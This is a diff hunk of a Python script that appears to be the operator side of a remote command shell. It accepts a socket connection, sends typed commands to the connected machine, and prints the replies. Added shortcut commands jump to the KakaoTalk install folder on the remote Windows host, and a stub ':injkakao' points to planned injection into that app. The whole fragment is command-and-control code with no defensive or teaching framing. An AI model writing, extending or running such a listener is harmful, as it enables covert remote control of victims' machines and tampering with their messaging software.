@@ -40,17 +40,19 @@ conn, addr = my_sock.accept()
 print('\n')
 print('Connected by', addr)
 while True:
-    cmd = input('$')
-    if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
-        ##Quick command
-        if(cmd==":cdkakao"):
-            cmd="cd C:\Program Files (x86)\Kakao\KakaoTalk"
-        if(cmd==":injkakao"):
-        ##
-        conn.send(cmd.encode())
-        try:
+    try:
+        cmd = input('$')
+        if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
+            ##Quick command
+            if(cmd==":cdkakao"):
+                cmd="cd C:\Program Files (x86)\Kakao\KakaoTalk"
+            if(cmd==":injkakao"):
+                cmd="asdf"
+            ##File command
+
+            conn.send(cmd.encode())
             print("wait for client message...")
-            client_response = conn.recv(10000)
+            client_response = conn.recv(2048)
             print(client_response.decode())
-        except Exception as e:
-            print(e)
+    except Exception as e:
+        print(e)
